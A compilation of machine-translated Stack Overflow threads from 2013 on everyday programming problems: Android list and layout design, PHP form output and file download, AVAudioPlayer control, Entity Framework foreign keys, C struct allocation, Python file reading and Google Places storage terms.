# android - 想在android中创建一个循环列表

> ID：15357123
> 
> 赞同：1
> 
> 时间：2013-03-12T09:08:55.573
> 
> 标签：android, list, mobile, circular-list

从过去的 3 天开始，我一直面临着一个小问题。我的任务是设计一个有两个片段的屏幕。（左侧和右侧）

左侧片段将包含一个列表，但此列表将出现在圆形视图中，例如

|@
|->@

|--->@

|----->@

|-------->@

|------->@

|------->@

|------->@

|-------->@

|----->@

|---->@

|-->@

|@

它应该是可旋转的，当我旋转列表时，我必须显示与第二个（右侧）片段中心的列表项相对应的数据。我打算使用片段。

谁能帮我解决这个问题

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T12:28:38.633

这是我的建议：

您可以使用 ListView，然后自己绘制所有子视图。

好的，您可以这样做：

通过创建一个新类并从 ListView 类派生该类来创建您自己的 ListView。然后，如果需要，您可以使用此方法删除分隔符 setDivider(Drawable divider) 然后您将不得不使用 drawChild(Canvas canvas, View child, long drawingTime) 您也可能最终使用此方法以及受保护的 void dispatchDraw (Canvas canvas) /// 需要在新的 ListView 类中被覆盖以获得更多控制权

如果循环列表中只有字符串，那么您将不得不从列表项的中间索引开始截断字符串......产生圆周运动效果。

这里我考虑ListView类会调用drawChild方法，每次列表上有一个动作，我们可以在那里产生轻微的动画

让我知道你是如何处理它的...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T14:13:44.883

如果您将使用自定义适配器，那么在您的 bindview 方法中..获取每个子视图并为视图提供一个新的边距布局参数，该参数具有一个根据当前子视图总数递增和递减的乘数。

您可以通过 getCount() 获得总孩子数；

将边距布局应用于视图组。

我做了同样的事情，除了我的结构对应于类似梯子的模式。

编辑：这些是我的代码中的一些损坏的片段，可以让您了解一下。

```
//This is my custom adapter that extends CursorAdapter
 @Override
    public void bindView(View view, Context context, final Cursor cursor) 
{
final RelativeLayout parent = (RelativeLayout)view.findViewById(R.id.text_wrapper);
//This is a parent view that i assigned as a top parent in my xml defining rows of listview
I am finding it through view of bindview. If i don't do this I'll get NPE.

//this is how you will be setting margins for each view

ViewGroup.MarginLayoutParams mlp = (ViewGroup.MarginLayoutParams) parent
                .getLayoutParams();
//here I am getting my relative layouts margin params.
mlp.leftMargin = 50*multiplier; //this will offset your each row. here multiplier can be like 0,1,2,3,2,1,0 giving you a circular view.you might have to write some method to get your desired multiplier value. 
```

每次调用 NotifyDatasetChanged 时都会调用绑定视图，并且会为屏幕上可见的每一行调用绑定视图。因此，您可以获得可见行的圆形模式。

}

# php - 将 PHP 变量作为文本框值

> ID：15357125
> 
> 赞同：1
> 
> 时间：2013-03-12T09:08:59.377
> 
> 标签：php, variables, textbox

我正在尝试编写将 php 变量作为文本框值传递的代码。这是我尝试过的以下代码：

```
echo "<td>"."<input type='text' value='<?php echo $start_date; ?>'/>"."</td>" 
```

这带来了一个错误：解析错误：语法错误，意外的 T_ECHO，期待 ',' 或 ';'

我尝试了各种重新措辞的方法：

```
 echo "<input type='text' value='<?php echo $start_date?>'/>"; 
```

（这纯粹是为了测试，因为我希望结果出现在表格行中）

但这表明：

```
<?php echo ?> 
```

在文本框中，我也收到此错误：注意：未定义变量：start_date ...

提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T09:11:15.477

你*不需要*从`echo`另一个开始。该变量`$start_date`可以在双引号内，因此可以插值。

```
echo "<td><input type='text' value='$start_date'/></td>"; //no unnecessary concatentation 
```

**编辑：**

*例如，在关联数组的*情况下，要回显`$row['start_date']`

```
echo "<td><input type='text' value='".$row['start_date']."/></td>"; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:10:22.463

你可以试试这个-

```
echo "<td>"."<input type='text' value='$start_date;'/>"."</td>"; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T09:10:27.053

你必须回显一次，例如：

```
echo "<td>"."<input type='text' value='$start_date'/>"."</td>"; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-12T09:12:47.457

用这个：

```
echo '<td><input type="text" value="'.$start_date.'"/></td>'; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-12T09:18:26.640

您应该始终牢记，如果将变量括在“”双引号内，则可以直接回显它。您不需要为此使用连接。例如

```
echo "<td>$rohit</td>"; //here you dont have to echo this like "<td>".$rohit."</td>". 
```

正如@Cthulhu所说的那样使用它。

# ios - 触发 AVAudioPlayer 以停止所有声音并播放选定的声音，除非单击播放（选定）按钮

> ID：15357126
> 
> 赞同：2
> 
> 时间：2013-03-12T09:09:03.590
> 
> 标签：ios, objective-c, xcode, avaudioplayer

我正在创建一个一次播放一种声音的音板应用程序。我希望 UIButton 能够在单击时停止播放所有其他声音并开始播放自己的声音。我设置了一个 AVAudioPlayer 来播放所有声音（单击时我更改了声音文件的 url，因为我一次只想要一个声音播放这不是问题）。我想知道如何停止所有其他声音并根据按下的按钮播放声音，但如果单击的按钮是当前正在播放声音的按钮，则该按钮只会停止声音。我知道这可以通过分离音频播放器并触发停止事件来实现，但我想避免复制和粘贴代码并尽可能保持效率，而且我只想要/需要一个音频播放器。这是我的代码：

```
- (IBAction)play {
 if (audioPlayer.playing == NO) {
    NSURL *url = [NSURL fileURLWithPath:[NSString stringWithFormat:@"%@/k.mp3", [[NSBundle mainBundle] resourcePath]]];
    NSError *error;
     [audioPlayer release];
     audioPlayer = [[AVAudioPlayer alloc] initWithContentsOfURL:url error:&error];
    audioPlayer.numberOfLoops = 0;

    AVAudioSession *audiosession = [AVAudioSession sharedInstance];
    [audiosession setCategory:AVAudioSessionCategoryAmbient error:nil];

    [audioPlayer play];
    [start setTitle:@"Stop" forState:UIControlStateNormal];
}
 else
     if (audioPlayer.playing == YES) {
         [audioPlayer stop];
     [start setTitle:@"Start" forState:UIControlStateNormal];
    }
    }

- (IBAction)play2 {
if (audioPlayer.playing == NO) {
    NSURL *url = [NSURL fileURLWithPath:[NSString stringWithFormat:@"%@/chicken.mp3", [[NSBundle mainBundle] resourcePath]]];
    NSError *error;
    [audioPlayer release];
    audioPlayer = [[AVAudioPlayer alloc] initWithContentsOfURL:url error:&error];
    audioPlayer.numberOfLoops = 0;

    AVAudioSession *audiosession = [AVAudioSession sharedInstance];
    [audiosession setCategory:AVAudioSessionCategoryAmbient error:nil];

    [audioPlayer play];
    [start2 setTitle:@"Stop" forState:UIControlStateNormal];
} else
    if (audioPlayer.playing == YES) {
        [audioPlayer stop];
        [start2 setTitle:@"Start" forState:UIControlStateNormal];
    }
} 
```

任何帮助表示赞赏。先感谢您！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-12T09:25:02.067

就这样做

```
-(void)stopAudio{

   if(audioPlayer && [audioPlayer isPlaying]){
     [audioPlayer stop];
     audioPlayer=nil;
   }

} 
```

并在每次点击时调用此函数..

```
- (IBAction)play2 {
    [self stopAudio];

    //Do your Stuffs
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:32:20.293

当你的按钮被点击时停止你的音频播放器并分配你的新歌曲网址然后播放它。当你点击按钮播放歌曲时写这个代码。

```
if(audioPlayer.isPlaying)
      [audioPlayer stop];    

AVAudioSession *audioSession = [AVAudioSession sharedInstance];
[audioSession setCategory:AVAudioSessionCategoryPlayback error:nil];
NSURL *url = [NSURL fileURLWithPath:YourSoundURL];
NSError *error;
audioPlayer = [[AVAudioPlayer alloc] initWithContentsOfURL:url error:&error];
audioPlayer.delegate=self;
[audioPlayer play];
[start2 setTitle:@"Stop" forState:UIControlStateNormal]; 
```

# php - PHP txt下载不写文本区内容

> ID：15357128
> 
> 赞同：1
> 
> 时间：2013-03-12T09:09:20.260
> 
> 标签：php, textarea

我有这个表单，您可以在其中将文本输入文本区域，然后提交 php 生成一个文本文件，该文件应该包含在文本区域中输入的文本。但问题出在我编写的代码中，文本文件确实下载但没有文本。所以我将文本区域更改为文本类型的输入字段，它返回文本文件中的数据，但没有换行符。这是我的代码

```
<html><body>    
<form action="download.php" method="post">
<textarea id="output" name="output"></textarea>
<input type="hidden" name="op" type="hidden" id="fakeop" >
<input type="submit">
</body></html> 
```

php文件的内容是

```
<?php
$filename = 'random.txt';
$somecontent = $_REQUEST["output"];
!$handle = fopen($filename, 'w+');
fwrite($handle, $somecontent);
fclose($handle);

header("Cache-Control: public");
header("Content-Description: File Transfer");
header("Content-Length: ". filesize("$filename").";");
header("Content-Disposition: attachment; filename=$filename");
header("Content-Type: application/octet-stream; "); 
header("Content-Transfer-Encoding: binary");

readfile($filename);

?> 
```

如果我更改为 $somecontent = $_REQUEST["op"]; 它确实返回带有内容的文本文件。但为什么不当它的输出。？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:49:33.477

您好，请使用以下代码测试 php 页面

```
<?php
$filename = 'random.txt';
$somecontent = $_POST["output"];
!$handle = fopen($filename, 'w+');
fwrite($handle, $somecontent);
fclose($handle);

header("Cache-Control: public");
header("Content-Description: File Transfer");
header("Content-Length: ". filesize("$filename").";");
header("Content-Disposition: attachment; filename=$filename");
header("Content-Type: application/octet-stream; "); 
header("Content-Transfer-Encoding: binary");

readfile($filename); 
```

?>

# entity-framework - 当 id 是 ef 中带有自定义 id 生成器的 fk 时如何不分配 id

> ID：15357129
> 
> 赞同：1
> 
> 时间：2013-03-12T09:09:24.833
> 
> 标签：entity-framework, ef-code-first, entity-framework-5

我有一个使用 EF5 的项目，我制作了一个自定义 Guid 生成器，并且我重写了 SaveChanges 方法来分配我的实体的 ID。

一切正常，除了在一种情况下：当一个实体的 ID 是另一个实体的另一个 ID 的 FK 时。

一点代码来解释这个问题：

**我有两个无法更改的实体：**

```
public class FixedEntityA
{
    public Guid Id { get; set;}
    public string SomeText { get; set; }
}

public class FixedEntityB
{
    public Guid Id { get; set;}
    public int OneInt { get; set; }
} 
```

**在我的项目中，我有一个这样定义的实体：**

```
public class ComposedEntity
{
    public Guid Id { get; set;}
    public FixedEntityA FixedA { get; set; }
    public FixedEntityB FixedB { get; set; }
    public double OneDouble { get; set; }
} 
```

**关系是：**

ComposedEntity 可能有 0 或 1 个 FixedEntityA

ComposedEntity 可能有 0 或 1 个 FixedEntityB

**对 id 的约束是：**

FixedEntityA 的 Id 是指向 ComposedEntity 的 Id 的 FK

FixedEntityB 的 Id 是指向 ComposedEntity 的 Id 的 FK

**映射类是：**

```
public ComposedEntity(): EntityTypeConfiguration<ComposedEntity>
{
    HasOptional(fea => fea.FixedA).WithRequired();
    HasOptional(feb => feb.FixedB).WithRequired();
} 
```

**这是我的 SaveChanges 覆盖：**

```
foreach (var entry in ChangeTracker.Entries<IEntity>().Where(e => e.State == EntityState.Added))
{
   Type t = entry.Entity.GetType();

   List<DatabaseGeneratedAttribute> info = t.GetProperty("Id")
                                            .GetCustomAttributes(typeof (DatabaseGeneratedAttribute), true)
                                            .Cast<DatabaseGeneratedAttribute>().ToList();

   if (!info.Any() || info.Single().DatabaseGeneratedOption != DatabaseGeneratedOption.Identity)
   {
       if (entry.Entity.Id == Guid.Empty)
            entry.Entity.Id = (Guid) _idGenerator.Generate();
   }
}
return base.SaveChanges(); 
```

此代码适用于所有类型的关系，除了在这种情况下，我错过了一个测试，以确保我没有在作为外键的 id 上设置 id，并且我不知道如何检查 Id 是否是一个FK...

这是此代码失败的示例对象：

```
var fea = new FixedEntityA();
var feb = new FixedEntityB();
var composedEntity = new ComposedEntity();

composedEntity.FixedA = fea;
composedEntity.FixedB = feb; 
```

如果插入整个图形，所有三个对象都标记为已添加，并且所有 Id 都是默认值。

问题是，使用当前的 SaveChanges 方法，我将遍历更改跟踪器中具有已添加状态的所有对象，并且我将为具有默认 Guid 的所有实体分配一个 Id 并打破我的 FK 约束。

提前谢谢各位！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T23:36:52.270

这里有一些代码可以获取给定类型的 FK 属性（我知道这很可怕）。应该足够简单，可以将其插入您的代码中。

```
var typeName = "Category";

var fkProperties = ((IObjectContextAdapter)db)
    .ObjectContext
    .MetadataWorkspace
    .GetItems<AssociationType>(DataSpace.CSpace)
    .Where(a => a.IsForeignKey)
    .Select(a => a.ReferentialConstraints.Single())
    .Where(c => c.FromRole.GetEntityType().Name == typeName)
    .SelectMany(c => c.FromProperties)
    .Select(p => p.Name); 
```

# c - 使用 C 动态分配结构

> ID：15357133
> 
> 赞同：0
> 
> 时间：2013-03-12T09:09:36.273
> 
> 标签：c

我正在尝试分配一个结构数组。当我尝试初始化一个值并在函数中打印该值时，一切正常。当我在 main 中打印相同的值时，我的程序崩溃了。

```
void getHeader(FILE* fpFile, HEADER *pHead)
{
   //  Local Declaration
   int worker, salesWeek, i;
   PERSON *list;

   //  Statement
   fscanf(fpFile, "%d %d", &worker, &salesWeek);
   list = aloPerson(worker);
   HEADER header = {worker, salesWeek, list};
   pHead = &header;

   return;
}// getHeader

PERSON* aloPerson(int worker)
{
   //  Local Declaration
   PERSON *list;

   //  Statement
   list =(PERSON*)calloc(worker, sizeof(PERSON));
   if(list == NULL)
   {
      MEM_ERROR, exit(103);
   }

   return list;
}// aloPerson 
```

这是我的结构。

```
typedef struct
{
int worker;
int weeks;
PERSON *pAry;
}HEADER; 
```

这是主要的：

```
int main ( void )
{
//  Local Declaration
FILE* fpFile;
char  nameIn[25];
char *endPro = "end";
HEADER *pHead;

//  Statement
printf("Please select file to to open.\nsales or sales_2: ");
scanf("%s", nameIn);
FLUSH;

do
{
    valiFile(nameIn);
    fpFile = openFile(nameIn);
    getHeader(fpFile, pHead);
    readFile(fpFile, pHead);

    repeat(nameIn);
}
while(strcmp(nameIn, endPro) != 0);

return 0; 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-12T09:15:23.183

我认为您需要更改这行代码：

```
HEADER header = {worker, salesWeek, list};
pHead = &header; 
```

成为：

```
HEADER header = {worker, salesWeek, list};
*pHead = header; 
```

还要确保 pHead 不为空，否则返回错误空参数。如果你想动态然后使用 calloc 分配头变量，那么你可以使用你的旧代码。

确保在您的主要功能中，这条线

```
HEADER *pHead; 
```

改为

```
HEADER *pHead = (HEADER*)calloc(1, sizeof(HEADER)); 
```

也不要忘记释放它。

# python - 使用python将数据从外部文件保存到列表中

> ID：15357134
> 
> 赞同：0
> 
> 时间：2013-03-12T09:09:36.353
> 
> 标签：python, linux

这个问题听起来可能是重复的；但这里是解释问题的代码：

```
#compares partitions displayed by 'df' command with the required list of partitions.

import subprocess
import re

p = subprocess.Popen("df -h", stdout=subprocess.PIPE, shell=True)
dfdata, _ = p.communicate()

dfdata = dfdata.replace("Mounted on", "")

columns = [list() for i in range(10)]
for line in dfdata.split("\n"):
    line = re.sub(" +", " ", line)
    for i,l in enumerate(line.split(" ")):
        columns[i].append(l)

sys_partition = columns[5]
req_partition = ['/', '/boot', '/home', '/usr', '/usr/local', '/var', '/tmp', '/mnt/floppy', '/mnt/cdrom', '/dev/shm']

def remove_common_elements(sys_partition, req_partition):
    sys_partition_new = sys_partition[:]
    req_partition_new = req_partition[:]

    for i in sys_partition:
        if i in req_partition_new:
            sys_partition_new.remove(i)
            req_partition_new.remove(i)
return req_partition_new

if set(sys_partition) == set(req_partition):
    print 'All the partitions exist in your system!!!'
else:
    print 'These partitions do not exist: ',
    print (remove_common_elements(sys_partition, req_partition)) 
```

在这个程序中，“sys_partition”表示系统中存在的分区（由 df 命令显示），“req_partition”表示理想情况下应该存在的分区列表。现在，我不想硬编码所需的分区（req_partition）。我想从某个外部文件中获取该输入并将其存储到一个列表中，然后像显示的那样处理它。请帮忙。如果问题令人困惑，我将尝试详细说明。提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T10:50:23.613

看起来您正在询问如何从文件中读取，并将项目放入列表中。如果是这样，请删除此行：

```
req_partition = ['/', '/boot', '/home', '/usr', '/usr/local', '/var', '/tmp',    '/mnt/floppy', '/mnt/cdrom', '/dev/shm'] 
```

用这些行替换它：

```
req_partition = list()
with open('/path/to/partitions') as f:
    for line in f:
        req_partition.append(line.strip()) 
```

并确保文件`/path/to/partitions`, 具有以下内容：

```
/
/boot
/home
/usr
/usr/local
/var
/tmp
/mnt/floppy
/mnt/cdrom
/dev/shm 
```

# android - Google Maps API：距离操纵

> ID：15357142
> 
> 赞同：-2
> 
> 时间：2013-03-12T09:10:07.457
> 
> 标签：android, google-maps

您如何操作 android Google maps API 以提供您作为输入的两个位置之间的距离？任何人请帮忙，已经卡了很长一段时间了......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:16:09.837

[给你](http://developer.android.com/reference/android/location/Location.html#distanceBetween%28double,%20double,%20double,%20double,%20float%5B%5D%29)。你甚至不需要地图 api，Android 拥有你所需要的一切。一点谷歌搜索就会把你带到那里。

# google-places-api - Google Places API - 我可以存储哪些数据？

> ID：15357143
> 
> 赞同：3
> 
> 时间：2013-03-12T09:10:07.537
> 
> 标签：google-places-api, google-places

我即将创建一个使用 Google Places Api 的应用程序。

只要我理解这些术语，就不允许在我的数据库中存储地点数据，例如名称、纬度、经度或详细信息。那正确吗 ？

我发现允许“缓存”数据而不是存储它。

为了在我的网站上显示“最后使用的地点”，我需要存储一些东西（例如地点的参考 ID）。

我可以在我的数据库中存储有关某个地点的哪些信息？

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2021-07-20T14:19:39.760

您可以从 google 地方响应中存储 place_id。如果您想对这些数据进行一些操作，您可以将 place_id 与 user_id 一起存储在本地表中。例如，如果您想从谷歌回复中喜欢任何餐厅：

```
user_id: 1,
place_id: "xyz",
isLiked: true 
```

您可以在本地数据库中进行上述设计。您可以从此表中获取“place_id”并从 google places api 获取完整的餐厅数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-10-15T19:17:25.973

您只能将地点 ID 存储在数据库中。每次要显示数据时都必须请求其他所有内容。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-03-12T20:24:15.800

据我了解，您可以存储 APi 中的所有内容：

`(b) No Pre-Fetching, Caching, or Storage of Content. You must not pre-fetch, cache, or store any Content, except that you may store: (i) limited amounts of Content for the purpose of improving the performance of your Maps API Implementation if you do so temporarily (and in no event for more than 30 calendar days), securely, and in a manner that does not permit use of the Content outside of the Service; and (ii) any content identifier or key that the Maps APIs Documentation specifically permits you to store. For example, you must not use the Content to create an independent database of "places" or other local listings information.`

但您不能存储用户数据，除非得到同意：

`(i) Your Maps API Implementation must notify the user in advance of the type(s) of data that you intend to collect from the user or the user's device. Your Maps API Implementation must not obtain or cache any user's location in any manner except with the user's prior consent. Your Maps API Implementation must let the user revoke the user's consent at any time.`

参考[谷歌地点条款](https://developers.google.com/maps/terms)（是的，它与谷歌地图相同）

看这两个链接：

*   [https://developers.google.com/places/policies#pre-fetching_caching_or_storage_of_content](https://developers.google.com/places/policies#pre-fetching_caching_or_storage_of_content)
*   [https://developers.google.com/maps/terms#section_10_1_3](https://developers.google.com/maps/terms#section_10_1_3)

# android - 如何在不同显示尺寸的大图像上保持多个 ImageView 的位置？

> ID：15357146
> 
> 赞同：0
> 
> 时间：2013-03-12T09:10:10.047
> 
> 标签：android, android-layout, position, imageview, relationship

我正在尝试制作一个显示在微调器中选择的吉他和弦的应用程序。

因此，我制作了吉他琴颈的大图像和几个小点图像，位于琴颈的音柱上。为了显示不同的和弦，我只是将正确的点设置为可见而其他点不可见。到目前为止，一切都很好。

我现在的问题是如何`ImageView`在使用其他分辨率不同的设备时将点保持在大的正确位置。

在这里您可以看到问题：

[![](../Images/63a7fdbcb290826a8500154d72e0cf14.png)](https://i.stack.imgur.com/QH5cm.png)

这是我的布局文件：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="@drawable/background" >

    <ImageButton
        android:id="@+id/back"
        android:layout_width="150dp"
        android:layout_height="40dp"
        android:layout_alignParentLeft="true"
        android:layout_alignParentTop="true"
        android:layout_marginRight="0dp"
        android:background="@drawable/back"
        android:contentDescription="back"
        android:text="@string/Lagerfeuer" />

    <ImageView
        android:layout_width="fill_parent"
        android:layout_height="40dp"
        android:layout_alignTop="@id/back"
        android:layout_toRightOf="@id/back"
        android:background="@drawable/back2"
        android:contentDescription="back2" />

    <TextView
        android:layout_width="100dp"
        android:layout_height="40dp"
        android:layout_alignLeft="@id/back"
        android:layout_alignParentTop="true"
        android:layout_marginLeft="25dp"
        android:layout_marginTop="12dp"
        android:text="@string/Lagerfeuer"
        android:textColor="#b4b4b4"
        android:textSize="12dp" />

    <Spinner
        android:id="@+id/chordSpinner"
        android:layout_width="fill_parent"
        android:layout_height="40dp"
        android:layout_alignParentBottom="true" />

    <ImageView
        android:id="@+id/griffbrett"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_above="@id/chordSpinner"
        android:layout_marginBottom="200dp"
        android:adjustViewBounds="true"
        android:src="@drawable/griffbrett" />

    <ImageView
        android:id="@+id/c11"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignTop="@id/griffbrett"
        android:layout_marginLeft="13dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c21"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c11"
        android:layout_below="@id/c11"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c31"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c11"
        android:layout_below="@id/c21"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c41"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c11"
        android:layout_below="@id/c31"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c51"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c11"
        android:layout_below="@id/c41"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c61"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c11"
        android:layout_below="@id/c51"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c12"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignTop="@id/c11"
        android:layout_marginLeft="22dp"
        android:layout_toRightOf="@id/c11"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c22"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c12"
        android:layout_below="@id/c11"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c32"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c12"
        android:layout_below="@id/c21"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c42"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c12"
        android:layout_below="@id/c31"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c52"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c12"
        android:layout_below="@id/c41"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c62"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c12"
        android:layout_below="@id/c51"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c13"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignTop="@id/c11"
        android:layout_marginLeft="22dp"
        android:layout_toRightOf="@id/c12"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c23"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c13"
        android:layout_below="@id/c11"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c33"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c13"
        android:layout_below="@id/c21"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c43"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c13"
        android:layout_below="@id/c31"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c53"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c13"
        android:layout_below="@id/c41"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c63"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c13"
        android:layout_below="@id/c51"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c14"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignTop="@id/c11"
        android:layout_marginLeft="22dp"
        android:layout_toRightOf="@id/c13"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c24"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c14"
        android:layout_below="@id/c11"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c34"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c14"
        android:layout_below="@id/c21"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c44"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c14"
        android:layout_below="@id/c31"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c54"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c14"
        android:layout_below="@id/c41"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c64"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c14"
        android:layout_below="@id/c51"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c15"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignTop="@id/c11"
        android:layout_marginLeft="22dp"
        android:layout_toRightOf="@id/c14"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c25"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c15"
        android:layout_below="@id/c11"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c35"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c15"
        android:layout_below="@id/c21"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c45"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c15"
        android:layout_below="@id/c31"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c55"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c15"
        android:layout_below="@id/c41"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/c65"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignLeft="@id/c15"
        android:layout_below="@id/c51"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/s1"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignParentLeft="true"
        android:layout_alignTop="@id/c11"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/s2"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignParentLeft="true"
        android:layout_below="@id/c11"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/s3"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignParentLeft="true"
        android:layout_below="@id/c21"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/s4"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignParentLeft="true"
        android:layout_below="@id/c31"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/s5"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignParentLeft="true"
        android:layout_below="@id/c41"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

    <ImageView
        android:id="@+id/s6"
        android:layout_width="10dp"
        android:layout_height="10dp"
        android:layout_alignParentLeft="true"
        android:layout_below="@id/c51"
        android:layout_marginTop="2dp"
        android:src="@drawable/dot"
        android:visibility="invisible" />

</RelativeLayout> 
```

